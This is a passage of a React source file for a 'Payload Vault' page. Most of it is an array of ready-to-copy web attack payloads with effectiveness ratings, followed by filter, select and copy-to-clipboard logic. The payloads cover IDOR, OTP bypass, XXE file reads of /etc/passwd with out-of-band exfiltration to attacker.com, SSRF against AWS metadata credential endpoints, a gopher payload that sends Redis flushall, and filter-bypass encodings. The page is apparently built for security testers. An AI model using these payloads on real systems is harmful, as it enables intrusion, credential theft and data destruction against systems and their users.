      target: "Node.js",
      description: "Direct object reference manipulation to access unauthorized user data by incrementing sequential IDs.",
      bypassTechnique: "Sequential ID enumeration"
    },
    {
      id: 501,
      name: "UUID IDOR",
      category: "IDOR",
      difficulty: "Intermediate",
      code: "GET /api/document/550e8400-e29b-41d4-a716-446655440000",
      effectiveness: 3,
      target: "Node.js",
      description: "Exploits predictable UUID patterns to access restricted documents.",
      bypassTechnique: "UUID prediction"
    },
    {
      id: 502,
      name: "Base64 Encoded IDOR",
      category: "IDOR",
      difficulty: "Advanced",
      code: "GET /api/file/dXNlcjEyMw== (decoded: user123)",
      effectiveness: 4,
      target: "Java",
      description: "Bypasses obfuscation by decoding and manipulating base64-encoded object references.",
      bypassTechnique: "Encoding bypass"
    },
    {
      id: 503,
      name: "JSON Body IDOR",
      category: "IDOR",
      difficulty: "Beginner",
      code: "POST /api/update-profile\n{\"user_id\": 124, \"name\": \"Hacker\"}",
      effectiveness: 5,
      target: "Node.js",
      description: "Manipulates user_id in JSON request body to update another user\'s profile data.",
      bypassTechnique: "Request body manipulation"
    },
    {
      id: 504,
      name: "Parameter Pollution IDOR",
      category: "IDOR",
      difficulty: "Intermediate",
      code: "GET /api/delete?id=123&id=456",
      effectiveness: 4,
      target: "PHP",
      description: "Exploits parameter pollution where backend processes last ID parameter to delete unauthorized records.",
      bypassTechnique: "Parameter pollution"
    },
    {
      id: 505,
      name: "GraphQL IDOR",
      category: "IDOR",
      difficulty: "Advanced",
      code: "query{user(id:\"124\"){email,phone,address}}",
      effectiveness: 5,
      target: "Node.js",
      description: "Accesses unauthorized user data through GraphQL queries with modified ID parameters.",
      bypassTechnique: "GraphQL query manipulation"
    },
    {
      id: 506,
      name: "Session-Based IDOR",
      category: "IDOR",
      difficulty: "Intermediate",
      code: "GET /api/orders?session_id=abc123def456",
      effectiveness: 4,
      target: "Java",
      description: "Manipulates session identifiers to access other users' order history and sensitive data.",
      bypassTechnique: "Session hijacking"
    },
    {
      id: 507,
      name: "Path Traversal IDOR",
      category: "IDOR",
      difficulty: "Advanced",
      code: "GET /api/files/../../../etc/passwd",
      effectiveness: 5,
      target: "Python",
      description: "Combines IDOR with path traversal to access system files and sensitive directories.",
      bypassTechnique: "Path traversal"
    },
    {
      id: 508,
      name: "Mass Assignment IDOR",
      category: "IDOR",
      difficulty: "Intermediate",
      code: "POST /api/update\n{\"id\":124,\"role\":\"admin\",\"email\":\"user@test.com\"}",
      effectiveness: 5,
      target: "Node.js",
      description: "Exploits mass assignment to modify unauthorized fields including ID and role escalation.",
      bypassTechnique: "Mass assignment"
    },

    // OTP Bypass Payloads - Keep existing (201-216 already added above)
    {
      id: 201,
      name: "OTP Reuse After Login",
      category: "OTP Bypass",
      difficulty: "Beginner",
      code: "POST /api/auth/verify-otp\n{\n  \"email\": \"user@example.com\",\n  \"otp\": \"482913\"\n}\n// Use same OTP again after successful login",
      effectiveness: 5,
      target: "Node.js",
      description: "OTP remains valid even after successful authentication. Test by reusing the same OTP code multiple times.",
      bypassTechnique: "OTP reuse exploitation"
    },
    {
      id: 202,
      name: "OTP Not Bound to User (IDOR)",
      category: "OTP Bypass",
      difficulty: "Intermediate",
      code: "POST /api/auth/verify-otp\n{\n  \"user_id\": \"102\",\n  \"otp\": \"482913\"\n}\n// Change user_id to target victim",
      effectiveness: 5,
      target: "Node.js",
      description: "OTP is not tied to specific user session. Attacker can use their own OTP with victim's user_id to gain access.",
      bypassTechnique: "OTP session binding bypass"
    },
    {
      id: 203,
      name: "Skip OTP Parameter",
      category: "OTP Bypass",
      difficulty: "Beginner",
      code: "POST /api/auth/verify-otp\n{\n  \"email\": \"user@example.com\"\n}\n// Remove OTP parameter entirely",
      effectiveness: 4,
      target: "Python",
      description: "Backend does not strictly enforce OTP validation. Removing OTP parameter may bypass authentication check.",
      bypassTechnique: "Parameter removal"
    },
    {
      id: 204,
      name: "OTP Valid After Password Change",
      category: "OTP Bypass",
      difficulty: "Intermediate",
      code: "POST /api/auth/verify-otp\n{\n  \"email\": \"user@example.com\",\n  \"otp\": \"482913\",\n  \"context\": \"password_reset\"\n}\n// OTP still works after password changed",
      effectiveness: 4,
      target: "Java",
      description: "OTP not invalidated after sensitive actions like password change. Old OTP codes remain active.",
      bypassTechnique: "OTP lifecycle bypass"
    },
    {
      id: 205,
      name: "Frontend-Only OTP Validation",
      category: "OTP Bypass",
      difficulty: "Beginner",
      code: "POST /api/auth/verify-otp\n{\n  \"email\": \"user@example.com\",\n  \"otp\": \"000000\"\n}\n// Backend trusts any value",
      effectiveness: 5,
      target: "PHP",
      description: "Backend trusts frontend validation without server-side verification. Any OTP value gets accepted.",
      bypassTechnique: "Client-side validation bypass"
    },
    {
      id: 206,
      name: "OTP Resend Same Code",
      category: "OTP Bypass",
      difficulty: "Beginner",
      code: "POST /api/auth/resend-otp\n{\n  \"email\": \"user@example.com\"\n}\n// Returns same OTP: 482913",
      effectiveness: 4,
      target: "Node.js",
      description: "Same OTP code reused across multiple resend attempts. Increases attack window for interception.",
      bypassTechnique: "OTP regeneration flaw"
    },
    {
      id: 207,
      name: "Rate Limit Bypass - IP Rotation",
      category: "OTP Bypass",
      difficulty: "Intermediate",
      code: "POST /api/auth/verify-otp\nX-Forwarded-For: 1.2.3.4\n{\n  \"email\": \"user@example.com\",\n  \"otp\": \"123456\"\n}\n// Change IP header each attempt",
      effectiveness: 3,
      target: "Python",
      description: "Rate limiting based on IP can be bypassed by rotating X-Forwarded-For headers to simulate different sources.",
      bypassTechnique: "Rate limit evasion"
    },
    {
      id: 208,
      name: "OTP Response Manipulation",
      category: "OTP Bypass",
      difficulty: "Advanced",
      code: "POST /api/auth/verify-otp\n{\n  \"email\": \"user@example.com\",\n  \"otp\": \"999999\"\n}\n// Intercept & change response: {\"valid\": false} → {\"valid\": true}",
      effectiveness: 4,
      target: "Node.js",
      description: "Manipulate response from server using proxy to change validation result from false to true.",
      bypassTechnique: "Response tampering"
    },
    {
      id: 209,
      name: "OTP Never Expires",
      category: "OTP Bypass",
      difficulty: "Beginner",
      code: "POST /api/auth/verify-otp\n{\n  \"email\": \"user@example.com\",\n  \"otp\": \"482913\"\n}\n// OTP from 48 hours ago still valid",
      effectiveness: 4,
      target: "Java",
      description: "OTP codes have no expiration time. Old codes remain valid indefinitely allowing prolonged attack window.",
      bypassTechnique: "Expiration bypass"
    },
    {
      id: 210,
      name: "Null/Empty OTP Accepted",
      category: "OTP Bypass",
      difficulty: "Beginner",
      code: "POST /api/auth/verify-otp\n{\n  \"email\": \"user@example.com\",\n  \"otp\": null\n}\n// OR {\"email\": \"user@example.com\", \"otp\": \"\"}",
      effectiveness: 5,
      target: "PHP",
      description: "Backend accepts null or empty OTP values as valid, bypassing authentication entirely.",
      bypassTechnique: "Null value exploitation"
    },
    {
      id: 211,
      name: "OTP Length Not Validated",
      category: "OTP Bypass",
      difficulty: "Intermediate",
      code: "POST /api/auth/verify-otp\n{\n  \"email\": \"user@example.com\",\n  \"otp\": \"12\"\n}\n// Only first 2 digits checked",
      effectiveness: 3,
      target: "Node.js",
      description: "Backend only validates partial OTP length, reducing entropy from 6 digits to 2-3 digits (100-1000 possibilities).",
      bypassTechnique: "Partial validation"
    },
    {
      id: 212,
      name: "OTP Case Sensitivity Bypass",
      category: "OTP Bypass",
      difficulty: "Beginner",
      code: "POST /api/auth/verify-otp\n{\n  \"email\": \"user@example.com\",\n  \"otp\": \"ABC123\"\n}\n// If OTP is alphanumeric, try lowercase",
      effectiveness: 3,
      target: "Python",
      description: "Alphanumeric OTP validation is case-insensitive, effectively doubling brute force success rate.",
      bypassTechnique: "Case manipulation"
    },
    {
      id: 213,
      name: "OTP Injection in Email",
      category: "OTP Bypass",
      difficulty: "Advanced",
      code: "POST /api/auth/send-otp\n{\n  \"email\": \"victim@example.com,attacker@evil.com\"\n}\n// OTP sent to both addresses",
      effectiveness: 4,
      target: "Java",
      description: "Email parameter accepts comma-separated values. OTP gets sent to both victim and attacker\'s email.",
      bypassTechnique: "Email injection"
    },
    {
      id: 214,
      name: "OTP Timing Attack",
      category: "OTP Bypass",
      difficulty: "Advanced",
      code: "POST /api/auth/verify-otp\n{\n  \"email\": \"user@example.com\",\n  \"otp\": \"123456\"\n}\n// Measure response time for each digit",
      effectiveness: 3,
      target: "Node.js",
      description: "OTP validation uses non-constant-time comparison. Response timing reveals correct digits one by one.",
      bypassTechnique: "Timing analysis"
    },
    {
      id: 215,
      name: "OTP Race Condition",
      category: "OTP Bypass",
      difficulty: "Advanced",
      code: "// Send 10 simultaneous requests:\nPOST /api/auth/verify-otp\n{\n  \"email\": \"user@example.com\",\n  \"otp\": \"123456\"\n}\n× 10 parallel requests",
      effectiveness: 4,
      target: "Python",
      description: "No proper locking mechanism. Parallel requests can bypass attempt counting and rate limiting.",
      bypassTechnique: "Race condition"
    },
    {
      id: 216,
      name: "OTP Auto-Fill Exploit",
      category: "OTP Bypass",
      difficulty: "Intermediate",
      code: "POST /api/auth/verify-otp\n{\n  \"email\": \"user@example.com\",\n  \"otp\": \"[AUTOFILL]\"\n}\n// Exploit browser autofill to leak OTP",
      effectiveness: 3,
      target: "Node.js",
      description: "Browser autofill mechanism can be exploited to extract OTP from email/SMS through hidden form fields.",
      bypassTechnique: "Autofill exploitation"
    },

    // XXE Payloads - NEW COMPREHENSIVE SECTION (5 BEST PAYLOADS)
    {
      id: 600,
      name: "Basic XXE File Read",
      category: "XXE",
      difficulty: "Intermediate",
      code: "<?xml version=\"1.0\"?>\n<!DOCTYPE root [\n<!ENTITY xxe SYSTEM \"file:///etc/passwd\">\n]>\n<root>&xxe;</root>",
      effectiveness: 5,
      target: "Java",
      description: "Classic XXE attack to read local files from server. Reads /etc/passwd to demonstrate file access vulnerability.",
      bypassTechnique: "External entity expansion",
      type: "File Disclosure"
    },
    {
      id: 601,
      name: "Blind XXE with Out-of-Band (OOB) Data Exfiltration",
      category: "XXE",
      difficulty: "Advanced",
      code: "<?xml version=\"1.0\"?>\n<!DOCTYPE root [\n<!ENTITY % file SYSTEM \"file:///etc/passwd\">\n<!ENTITY % dtd SYSTEM \"http://attacker.com/evil.dtd\">\n%dtd;\n]>\n<root>&send;</root>\n\n<!-- evil.dtd content:\n<!ENTITY % all \"<!ENTITY send SYSTEM 'http://attacker.com/?data=%file;'>\">\n%all;\n-->",
      effectiveness: 5,
      target: "Java",
      description: "Blind XXE using external DTD to exfiltrate file contents when direct output is not visible. Data sent to attacker\'s server via HTTP.",
      bypassTechnique: "Out-of-band data exfiltration",
      type: "Blind XXE"
    },
    {
      id: 602,
      name: "XXE via SVG File Upload",
      category: "XXE",
      difficulty: "Intermediate",
      code: "<?xml version=\"1.0\" standalone=\"yes\"?>\n<!DOCTYPE svg [\n<!ELEMENT svg ANY>\n<!ENTITY xxe SYSTEM \"file:///etc/hostname\">\n]>\n<svg width=\"500\" height=\"500\">\n<text x=\"20\" y=\"35\">&xxe;</text>\n</svg>",
      effectiveness: 4,
      target: "PHP",
      description: "XXE payload embedded in SVG file upload. When SVG is processed, entity expands to reveal server hostname or other files.",
      bypassTechnique: "File upload exploitation",
      type: "SVG-Based XXE"
    },
    {
      id: 603,
      name: "XXE to SSRF (Internal Network Scanning)",
      category: "XXE",
      difficulty: "Advanced",
      code: "<?xml version=\"1.0\"?>\n<!DOCTYPE root [\n<!ENTITY xxe SYSTEM \"http://192.168.1.1:8080/admin\">\n]>\n<root>&xxe;</root>",
      effectiveness: 5,
      target: "Java",
      description: "Uses XXE to perform SSRF attacks on internal network. Accesses internal services not exposed to internet (admin panels, AWS metadata).",
      bypassTechnique: "Protocol exploitation",
      type: "XXE to SSRF"
    },
    {
      id: 604,
      name: "XXE Parameter Entity Attack",
      category: "XXE",
      difficulty: "Advanced",
      code: "<?xml version=\"1.0\"?>\n<!DOCTYPE root [\n<!ENTITY % file SYSTEM \"php://filter/convert.base64-encode/resource=/etc/passwd\">\n<!ENTITY % dtd SYSTEM \"http://attacker.com/xxe.dtd\">\n%dtd;\n%all;\n]>\n<root>&send;</root>",
      effectiveness: 5,
      target: "PHP",
      description: "Parameter entity attack to read files and exfiltrate via OOB channel. Uses PHP filter to base64 encode file contents for reliable exfiltration.",
      bypassTechnique: "Parameter entity injection",
      type: "Advanced XXE"
    },

    // SSRF Payloads - NEW COMPREHENSIVE SECTION (10 BEST PAYLOADS)
    {
      id: 700,
      name: "Basic Localhost SSRF",
      category: "SSRF",
      difficulty: "Beginner",
      code: "http://localhost:8080/admin",
      effectiveness: 5,
      target: "Python",
      description: "Classic SSRF to access internal services via localhost. Bypasses firewall restrictions to access admin panels.",
      bypassTechnique: "Localhost access",
      type: "Basic SSRF"
    },
    {
      id: 701,
      name: "AWS Metadata SSRF (IMDSv1)",
      category: "SSRF",
      difficulty: "Advanced",
      code: "http://169.254.169.254/latest/meta-data/iam/security-credentials/",
      effectiveness: 5,
      target: "Python",
      description: "Exploits SSRF to access AWS EC2 instance metadata service. Retrieves IAM role credentials for privilege escalation.",
      bypassTechnique: "Cloud metadata access",
      type: "Cloud SSRF"
    },
    {
      id: 702,
      name: "DNS Rebinding SSRF",
      category: "SSRF",
      difficulty: "Advanced",
      code: "http://attacker-controlled-dns.com (resolves to 169.254.169.254 after initial check)",
      effectiveness: 5,
      target: "Node.js",
      description: "Uses DNS rebinding to bypass SSRF protections. Domain initially resolves to safe IP, then changes to internal IP after validation.",
      bypassTechnique: "DNS rebinding",
      type: "Advanced SSRF"
    },
    {
      id: 703,
      name: "Localhost Bypass with IPv6",
      category: "SSRF",
      difficulty: "Intermediate",
      code: "http://[::1]:8080/admin\nhttp://[0:0:0:0:0:0:0:1]:8080/admin",
      effectiveness: 4,
      target: "Java",
      description: "Bypasses blacklist filters using IPv6 localhost notation. Many filters only block IPv4 127.0.0.1.",
      bypassTechnique: "IPv6 bypass",
      type: "Filter Bypass"
    },
    {
      id: 704,
      name: "URL Encoding SSRF Bypass",
      category: "SSRF",
      difficulty: "Intermediate",
      code: "http://127.0.0.1 → http://%31%32%37%2e%30%2e%30%2e%31\nhttp://169.254.169.254 → http://%31%36%39%2e%32%35%34%2e%31%36%39%2e%32%35%34",
      effectiveness: 4,
      target: "PHP",
      description: "URL encodes IP address to bypass regex-based SSRF filters. Encoded characters decode to blocked IP addresses.",
      bypassTechnique: "URL encoding",
      type: "Encoding Bypass"
    },
    {
      id: 705,
      name: "Octal/Decimal IP Bypass",
      category: "SSRF",
      difficulty: "Advanced",
      code: "http://0177.0.0.1 (octal for 127.0.0.1)\nhttp://2130706433 (decimal for 127.0.0.1)\nhttp://0x7f.0x0.0x0.0x1 (hex for 127.0.0.1)",
      effectiveness: 5,
      target: "Python",
      description: "Alternative IP representations bypass simple string matching filters. Browser/server parses these formats as valid IPs.",
      bypassTechnique: "IP representation manipulation",
      type: "Encoding Bypass"
    },
    {
      id: 706,
      name: "Redirect-Based SSRF",
      category: "SSRF",
      difficulty: "Intermediate",
      code: "http://attacker.com/redirect.php\n\n<!-- redirect.php:\nheader('Location: http://169.254.169.254/latest/meta-data/');\n-->",
      effectiveness: 4,
      target: "PHP",
      description: "Uses open redirect to bypass SSRF protections. Server follows redirect to internal resources after initial URL validation.",
      bypassTechnique: "Open redirect chaining",
      type: "Redirect SSRF"
    },
    {
      id: 707,
      name: "Protocol Smuggling SSRF",
      category: "SSRF",
      difficulty: "Advanced",
      code: "gopher://127.0.0.1:6379/_*1%0d%0a$8%0d%0aflushall%0d%0a\nfile:///etc/passwd\ndict://127.0.0.1:11211/stats",
      effectiveness: 5,
      target: "Python",
      description: "Uses alternative protocols (gopher, file, dict) to interact with internal services. Can inject Redis commands, read files, query memcached.",
      bypassTechnique: "Protocol exploitation",
      type: "Protocol SSRF"
    },
    {
      id: 708,
      name: "AWS IMDSv2 SSRF (Requires Session Token)",
      category: "SSRF",
      difficulty: "Advanced",
      code: "# Step 1: Get token\nPUT http://169.254.169.254/latest/api/token\nX-aws-ec2-metadata-token-ttl-seconds: 21600\n\n# Step 2: Use token\nGET http://169.254.169.254/latest/meta-data/iam/security-credentials/\nX-aws-ec2-metadata-token: <token>",
      effectiveness: 4,
      target: "Python",
      description: "Exploits IMDSv2 (session-based) by first obtaining token via PUT request, then accessing metadata. More secure than v1 but still vulnerable.",
      bypassTechnique: "Session token exploitation",
      type: "Cloud SSRF"
    },
    {
      id: 709,
      name: "Blind SSRF via PDF Generation",
      category: "SSRF",
      difficulty: "Advanced",
      code: "<html>\n<body>\n<img src=\"http://169.254.169.254/latest/meta-data/iam/security-credentials/\">\n<iframe src=\"http://localhost:6379\"></iframe>\n</body>\n</html>",
      effectiveness: 4,
      target: "Node.js",
      description: "Blind SSRF via HTML to PDF conversion services. Injected HTML elements make requests to internal resources during PDF generation.",
      bypassTechnique: "HTML injection",
      type: "Blind SSRF"
    }
  ];

  const handleFilterChange = (key, value) => {
    setFilters(prev => ({ ...prev, [key]: value }));
  };

  const handleResetFilters = () => {
    setFilters({
      vulnerability: 'all',
      complexity: 'all',
      target: 'all',
      bypass: 'all'
    });
  };

  const handleToggleSelect = (id) => {
    setSelectedPayloads(prev =>
      prev?.includes(id) ? prev?.filter(p => p !== id) : [...prev, id]
    );
  };

  const filteredPayloads = useMemo(() => {
    let filtered = allPayloads;

    if (filters?.vulnerability !== 'all') {
      const vulnMap = {
        'xss': ['Reflected XSS', 'Stored XSS', 'DOM-Based XSS'],
        'reflected-xss': ['Reflected XSS'],
        'stored-xss': ['Stored XSS'],
        'dom-xss': ['DOM-Based XSS'],
        'sqli': ['SQL Injection'],
        'crlf': ['CRLF Injection'],
        'idor': ['IDOR'],
        'xxe': ['XXE'],
        'ssrf': ['SSRF'],
        'otp-bypass': ['OTP Bypass']
      };
      
      const targetCategories = vulnMap?.[filters?.vulnerability] || [];
      filtered = filtered?.filter(p => targetCategories?.includes(p?.category));
    }

    if (filters?.complexity !== 'all') {
      const complexityMap = {
        'beginner': 'Beginner',
        'intermediate': 'Intermediate',
        'advanced': 'Advanced'
      };
      filtered = filtered?.filter(p => p?.difficulty === complexityMap?.[filters?.complexity]);
    }

    if (filters?.target !== 'all') {
      const targetMap = {
        'javascript': 'JavaScript',
        'php': 'PHP',
        'python': 'Python',
        'java': 'Java',
        'nodejs': 'Node.js',
        'asp.net': 'ASP.NET'
      };
      filtered = filtered?.filter(p => p?.target === targetMap?.[filters?.target]);
    }

    if (mode === 'beginner') {
      filtered = filtered?.filter(p => p?.difficulty === 'Beginner' || p?.difficulty === 'Intermediate');
    }

    return filtered;
  }, [filters, mode, allPayloads]);

  const handleSelectAll = () => {
    setSelectedPayloads(filteredPayloads?.map(p => p?.id));
  };

  const handleDeselectAll = () => {
    setSelectedPayloads([]);
  };

  const handleCopySelected = () => {
    const selectedPayloadData = allPayloads?.filter(p => selectedPayloads?.includes(p?.id))?.map(p => `// ${p?.name}\n${p?.code}`)?.join('\n\n');
    navigator.clipboard?.writeText(selectedPayloadData);
  };

  const handleCopy = (id) => {
  };

  const groupedPayloads = useMemo(() => {
    const groups = {};
    filteredPayloads?.forEach(payload => {
      if (!groups?.[payload?.category]) {
        groups[payload.category] = [];
      }
      groups?.[payload?.category]?.push(payload);
    });
    return groups;
  }, [filteredPayloads]);

  return (
    <div className="min-h-screen bg-background">
      <Sidebar />
      <main className="lg:ml-[280px] min-h-screen lg:w-[calc(100%-280px)] overflow-x-hidden">
        <div className="sticky top-0 z-40 bg-background/80 backdrop-blur-lg border-b border-border">
          <div className="pl-16 pr-4 md:px-6 lg:px-8 py-4">
            <div className="flex flex-col lg:flex-row lg:items-center justify-between gap-4">
              <div className="flex-1 max-w-2xl">
                <GlobalSearch />
              </div>
              <div className="flex-shrink-0">
                <ModeToggle mode={mode} onToggle={setMode} />
              </div>
            </div>
          </div>
        </div>

        <div className="px-4 md:px-6 lg:px-8 py-6 md:py-8">
          <Breadcrumb />

          <div className="mb-6 md:mb-8">
            <div className="flex items-center gap-3 mb-3 md:mb-4">
              <div className="w-12 h-12 md:w-14 md:h-14 rounded-lg bg-accent/10 flex items-center justify-center flex-shrink-0">
                <Icon name="Database" size={28} color="var(--color-accent)" />
              </div>
              <div className="flex-1 min-w-0">
                <h1 className="text-2xl md:text-3xl lg:text-4xl font-bold text-foreground">
                  Payload Vault
                </h1>
                <p className="text-sm md:text-base text-muted-foreground mt-1">
                  Comprehensive repository of attack payloads and testing vectors
                </p>
              </div>
            </div>

            <div className="flex flex-wrap items-center gap-3 mt-4">
              <div className="flex items-center gap-2 px-3 py-1.5 bg-surface border border-border rounded-lg">
                <Icon name="Shield" size={16} color="var(--color-accent)" className="flex-shrink-0" />
                <span className="text-sm text-muted-foreground whitespace-nowrap">
                  <span className="text-accent font-medium">{allPayloads?.length}</span> Total Payloads
                </span>
              </div>
              <div className="flex items-center gap-2 px-3 py-1.5 bg-surface border border-border rounded-lg">
                <Icon name="Layers" size={16} color="var(--color-accent-green)" className="flex-shrink-0" />
                <span className="text-sm text-muted-foreground whitespace-nowrap">
                  <span className="text-accent-green font-medium">6</span> Categories
                </span>
              </div>
              <div className="flex items-center gap-2 px-3 py-1.5 bg-surface border border-border rounded-lg">
                <Icon name="TrendingUp" size={16} color="var(--color-warning)" className="flex-shrink-0" />
                <span className="text-sm text-muted-foreground whitespace-nowrap">
                  Updated <span className="text-foreground font-medium">Everyday :)</span>
                </span>
              </div>
            </div>
          </div>

          <FilterControls
            filters={filters}
            onFilterChange={handleFilterChange}
            resultCount={filteredPayloads?.length}
            onReset={handleResetFilters}
          />

          {filteredPayloads?.length === 0 ? (
            <EmptyState onReset={handleResetFilters} />
          ) : (
            <div>
              {Object.entries(groupedPayloads)?.map(([category, payloads]) => (
                <CategorySection
                  key={category}
                  category={category}
                  payloads={payloads}
                  onCopy={handleCopy}
                  selectedPayloads={selectedPayloads}
                  onToggleSelect={handleToggleSelect}
                />
              ))}
            </div>
          )}

          <BulkOperations
            selectedCount={selectedPayloads?.length}
            onSelectAll={handleSelectAll}
            onDeselectAll={handleDeselectAll}
            onCopySelected={handleCopySelected}
          />
        </div>
      </main>
    </div>
  );
};

export default PayloadVault;